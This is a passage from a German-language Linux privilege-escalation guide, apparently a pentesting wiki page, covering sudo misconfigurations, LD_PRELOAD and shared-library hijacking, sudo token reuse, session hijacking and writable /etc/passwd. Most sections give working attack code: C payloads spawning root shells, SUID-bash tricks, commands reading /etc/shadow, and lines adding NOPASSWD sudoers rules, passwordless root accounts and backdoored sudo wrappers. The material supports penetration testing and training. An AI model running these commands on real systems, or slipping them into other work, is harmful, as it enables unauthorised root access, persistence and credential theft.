Terraform wird den Go plugin handshake nicht erfolgreich abschließen, führt die Payload jedoch vor dem Abbruch als root aus und hinterlässt eine SUID-Shell.

### TF_VAR-Überschreibungen + Umgehung der Symlink-Validierung

Terraform-Variablen können über `TF_VAR_<name>`-Umgebungsvariablen bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung übernimmt. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` können mit Symlinks umgangen werden:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den Symlink auf und kopiert die echte `/root/root.txt` an ein für den Angreifer lesbares Ziel. Derselbe Ansatz kann verwendet werden, um in privilegierte Pfade zu **schreiben**, indem Ziel-Symlinks vorab erstellt werden (z. B. mit einem Verweis auf den Zielpfad des Providers innerhalb von `/etc/cron.d/`).

### requiretty / !requiretty

Auf einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert werden, wodurch sudo nur von einem interaktiven TTY aus ausgeführt werden kann. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht interaktiven Kontexten wie Reverse Shells, cron jobs oder Skripten ausgeführt werden.
```bash
Defaults !requiretty
```
Dies ist an sich keine direkte Schwachstelle, erweitert jedoch die Situationen, in denen sudo-Regeln ohne eine vollständige PTY missbraucht werden können.

### Sudo env_keep+=PATH / unsicherer secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` oder einen `secure_path` mit durch den Angreifer beschreibbaren Einträgen (z. B. `/home/<user>/bin`) anzeigt, kann jeder relative Befehl innerhalb des durch sudo erlaubten Ziels überschattet werden.

- Voraussetzungen: eine sudo-Regel (oft `NOPASSWD`), die ein Script/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps` usw.), sowie ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführung unter Umgehung von Pfaden
**Springen**, um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne command path

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** erteilt wird: _hacker10 ALL= (root) less_, kannst du dies ausnutzen, indem du die PATH-Variable änderst
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid**-Binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (prüfe den Inhalt eines ungewöhnlichen SUID-Binaries immer mit** _**strings**_ **)**.

[Beispiele für auszuführende Payloads.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-Binary mit Befehlspfad

Wenn das **suid**-Binary **einen anderen Befehl mit Angabe des Pfads ausführt**, kannst du versuchen, eine **Funktion** mit dem Namen des Befehls zu **exportieren**, den die SUID-Datei aufruft.

Wenn ein SUID-Binary beispielsweise _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du dann die SUID-Binary aufrufst, wird diese Funktion ausgeführt.

### Writable script executed by a SUID wrapper

Eine häufige Fehlkonfiguration bei Custom-Apps ist ein von root besessener SUID-Binary-Wrapper, der ein Script ausführt, während das Script selbst für Benutzer mit niedrigen Privilegien beschreibbar ist.

Typisches Muster:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Wenn `/usr/local/bin/backup.sh` beschreibbar ist, kannst du Payload-Befehle anhängen und anschließend den SUID-Wrapper ausführen:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Schnellüberprüfungen:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Dieser Angriffspfad ist besonders häufig bei „maintenance“-/„backup“-Wrappern anzutreffen, die in `/usr/local/bin` ausgeliefert werden.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Prozess wird als Preloading einer Library bezeichnet.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** bei Executables, bei denen die reale User-ID (_ruid_) nicht mit der effektiven User-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Libraries aus Standardpfaden vorab geladen, die ebenfalls suid/sgid sind.

Eine Privilege Escalation kann auftreten, wenn du die Möglichkeit hast, Befehle mit `sudo` auszuführen, und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht, dass die Umgebungsvariable **LD_PRELOAD** auch bei der Ausführung von Befehlen mit `sudo` erhalten bleibt und erkannt wird, was potenziell zur Ausführung beliebigen Codes mit erweiterten Privilegien führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern unter **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Anschließend **kompilieren Sie es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **eskalieren Sie Berechtigungen** durch Ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn du auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich erscheint, solltest du überprüfen, ob es **.so**-Dateien ordnungsgemäß lädt. Dies lässt sich durch Ausführen des folgenden Befehls prüfen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Wenn beispielsweise ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auftritt, deutet dies auf eine potenzielle Ausnutzungsmöglichkeit hin.

Um dies auszunutzen, würde man zunächst eine C-Datei, beispielsweise _"/path/to/.config/libcalc.c"_, mit folgendem Code erstellen:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt darauf ab, nach dem Kompilieren und Ausführen die Berechtigungen zu erhöhen, indem Dateiberechtigungen manipuliert und eine Shell mit erhöhten Berechtigungen ausgeführt wird.

Kompiliere die obige C-Datei mit folgendem Befehl in eine Shared Object-Datei (.so):
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei den Exploit auslösen und eine potenzielle Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nachdem wir eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Ordner lädt, in den wir schreiben können, erstellen wir nun die Bibliothek mit dem erforderlichen Namen in diesem Ordner:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn du einen Fehler wie folgenden erhältst
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die von dir generierte library eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe für Fälle, in denen du **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder erhöhte Privilegien aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten sowie andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo-Zugriff**, aber nicht das Passwort hast, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und anschließend das Session-Token hijackst**.

Voraussetzungen für die Privilegieneskalation:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten `sudo`** verwendet, um etwas auszuführen (standardmäßig ist das die Gültigkeitsdauer des sudo-Tokens, mit dem wir `sudo` verwenden können, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du musst es hochladen können)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen.)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien mithilfe von** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) **eskalieren**.

- Der **erste Exploit** (`exploit.sh`) erstellt das Binary `activate_sudo_token` in _/tmp_. Du kannst es verwenden, um **das sudo-Token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine Root-Shell; führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die **root gehört und über setuid verfügt**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) **erstellt eine sudoers-Datei**, die **sudo-Tokens dauerhaft gültig macht und allen Benutzern die Verwendung von sudo erlaubt**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibberechtigungen** für den Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo token für einen Benutzer und eine PID zu erstellen**.\
Wenn du beispielsweise die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit der PID 1234 hast, kannst du **sudo-Berechtigungen erlangen**, ohne das Passwort kennen zu müssen, indem du Folgendes ausführst:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien innerhalb von `/etc/sudoers.d` legen fest, wer `sudo` verwenden darf und wie. Diese Dateien können **standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du in der Lage sein, **interessante Informationen zu erhalten**, und wenn du eine beliebige Datei **schreiben** kannst, wirst du in der Lage sein, **deine Rechte zu erweitern**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur Binärdatei `sudo`, wie etwa `doas` für OpenBSD. Denke daran, die Konfiguration unter `/etc/doas.conf` zu überprüfen.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Wenn `doas` einen Editor oder Interpreter erlaubt, prüfe GTFOBins-ähnliche Escapes:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Wenn du weißt, dass sich ein **User normalerweise mit einer Maschine verbindet und `sudo`** zur Rechteausweitung verwendet, und du eine Shell im Kontext dieses Users erhalten hast, kannst du eine **neue sudo-Executable erstellen**, die deinen Code als root und anschließend den Befehl des Users ausführt. Ändere dann den **$PATH** des User-Kontexts (indem du beispielsweise den neuen Pfad zu .bash_profile hinzufügst), sodass beim Ausführen von sudo deine sudo-Executable ausgeführt wird.

Beachte, dass du bei Verwendung einer anderen Shell (nicht bash) andere Dateien ändern musst, um den neuen Pfad hinzuzufügen. Beispielsweise ändert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc` und `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder indem du etwas wie Folgendes ausführst:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Libraries** **gesucht** wird. Der Inhalt von `/etc/ld.so.conf.d/libc.conf` lautet beispielsweise `/usr/local/lib`. **Das bedeutet, dass das System innerhalb von `/usr/local/lib` nach Libraries sucht**.

Falls ein **Benutzer Schreibrechte** auf einen der angegebenen Pfade besitzt: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, auf eine Datei innerhalb von `/etc/ld.so.conf.d/` oder auf einen in der Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/*.conf` angegebenen Ordner, kann er möglicherweise seine Privilegien erweitern.\
Siehe auf der folgenden Seite, **wie diese Fehlkonfiguration ausgenutzt werden kann**:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der Bibliothek nach `/var/tmp/flag15/` wird sie vom Programm an diesem Ort verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` eine bösartige Bibliothek in `/var/tmp`.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux capabilities stellen einem **Prozess eine Teilmenge der verfügbaren root privileges** zur Verfügung. Dadurch werden root **privileges in kleinere und voneinander unabhängige Einheiten** aufgeteilt. Jede dieser Einheiten kann Prozessen anschließend unabhängig gewährt werden. Auf diese Weise wird der vollständige Satz an privileges reduziert, wodurch die Exploit-Risiken sinken.\
Lies die folgende Seite, um **mehr über capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer mit "**cd**" in den Ordner wechseln kann.\
Das **"read"-Bit** bedeutet, dass der Benutzer die **files** **auflisten** kann, und das **"write"-Bit** bedeutet, dass der Benutzer neue **files** **löschen** und **erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die zweite Ebene der frei wählbaren Berechtigungen dar und können die **traditionellen ugo/rwx-Berechtigungen überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese **Granularität ermöglicht eine präzisere Zugriffsverwaltung**. Weitere Informationen findest du [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dateien mit bestimmten ACLs aus dem System abrufen:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteckte ACL-Backdoor in sudoers-Drop-ins

Eine häufige Fehlkonfiguration ist eine root-eigene Datei in `/etc/sudoers.d/` mit dem Modus `440`, die einem Benutzer mit niedrigen Privilegien über eine ACL dennoch Schreibzugriff gewährt.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Wenn du etwas wie `user:alice:rw-` siehst, kann der Benutzer trotz restriktiver Modusbits eine sudo-Regel anhängen:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dies ist ein wirkungsvoller ACL-Persistence-/Privesc-Pfad, da er bei Prüfungen, die sich ausschließlich auf `ls -l` stützen, leicht übersehen wird.

## Offene Shell-Sitzungen

In **alten Versionen** können Sie möglicherweise eine **Shell**-Sitzung eines anderen Benutzers (**root**) **hijacken**.\
In **neueren Versionen** können Sie nur noch eine Verbindung zu screen-Sitzungen Ihres **eigenen Benutzers** **herstellen**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung** finden.

### screen sessions hijacking

**screen-Sitzungen auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![Hijacking von screen-Sitzungen – Socket-Speicherorte (auf manchen Systemen ist einer als symbolischer Link des anderen verfügbar): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**An eine Sitzung anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **alten tmux-Versionen**. Ich konnte keine von root erstellte tmux-Session (v2.1) als nicht privilegierter Benutzer hijacken.

**tmux-Sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket-Speicherorte (manche Systeme stellen einen als Symlink des anderen bereit) – Hijacking von tmux-Sessions: tmux -S /tmp/dev sess ls Listet Sitzungen über diesen Socket auf; du kannst eine tmux-Session über diesen Socket starten...](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Prüfe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die zwischen September 2006 und dem 13. Mai 2008 auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) generiert wurden, können von diesem Bug betroffen sein.\
Dieser Bug wird beim Erstellen eines neuen SSH-Schlüssels auf diesen Betriebssystemen verursacht, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **man anhand des öffentlichen SSH-Schlüssels nach dem entsprechenden privaten Schlüssel suchen kann**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interessante SSH-Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standardwert ist `no`.
- **PubkeyAuthentication:** Gibt an, ob die Authentifizierung mit öffentlichen Schlüsseln erlaubt ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, gibt dieser Wert an, ob der Server die Anmeldung bei Konten mit leeren Passwort-Strings erlaubt. Der Standardwert ist `no`.

### Dateien zur Anmeldekontrolle

Diese Dateien beeinflussen, wer sich anmelden kann und wie:

- **`/etc/nologin`**: Wenn vorhanden, blockiert diese Datei Anmeldungen von Nicht-root-Benutzern und gibt ihre Nachricht aus.
- **`/etc/securetty`**: Beschränkt, von welchen Terminals aus sich root anmelden kann (TTY-Allowlist).
- **`/etc/motd`**: Banner nach der Anmeldung (kann Informationen über die Umgebung oder Wartungsdetails leaken).

### PermitRootLogin

Gibt an, ob sich root per SSH anmelden kann; der Standardwert ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: root kann sich nur mit einem privaten Schlüssel anmelden, und nur wenn die Optionen für die Befehle angegeben sind
- `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die zur Benutzerauthentifizierung verwendet werden können. Sie können Token wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade** (beginnend mit `/`) oder **relative Pfade ausgehend vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration gibt an, dass SSH beim Versuch, sich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, den öffentlichen Schlüssel Ihres Schlüssels mit den Schlüsseln in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH-Agent-Forwarding ermöglicht es Ihnen, **Ihre lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf Ihrem Server zu hinterlassen. Dadurch können Sie sich per SSH **zu einem Host verbinden** und von dort aus **zu einem anderen Host weiterverbinden**, **wobei** der **Schlüssel** verwendet wird, der sich auf Ihrem **ursprünglichen Host** befindet.

Sie müssen diese Option in `$HOME/.ssh.config` wie folgt festlegen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass der Host jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, auf die Schlüssel zugreifen kann, wenn `Host` auf `*` gesetzt ist (dies stellt ein Sicherheitsproblem dar).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann das ssh-agent-Forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (standardmäßig ist es erlaubt).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da du es möglicherweise **missbrauchen kannst, um deine Rechte zu erweitern**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profildateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Wenn du daher **eine davon schreiben oder ändern kannst, kannst du deine Rechte erweitern**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein **ungewöhnliches Profilskript** gefunden wird, solltest du es auf **sensible Daten** überprüfen.

### Passwd/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann ein Backup geben. Daher wird empfohlen, **alle davon zu finden** und zu **überprüfen, ob du sie lesen kannst**, um festzustellen, **ob die Dateien Hashes enthalten**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen können Sie **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbare /etc/passwd

Generiere zuerst mit einem der folgenden Befehle ein Passwort.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Fügen Sie anschließend den Benutzer `hacker` hinzu und geben Sie das generierte Passwort ein.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden.

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit des Computers beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`; außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du **in einige sensible Dateien schreiben** kannst. Kannst du beispielsweise in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn auf dem Computer ein **tomcat**-Server läuft und du die **Tomcat-Servicekonfigurationsdatei innerhalb von /etc/systemd/ ändern** kannst, kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner überprüfen

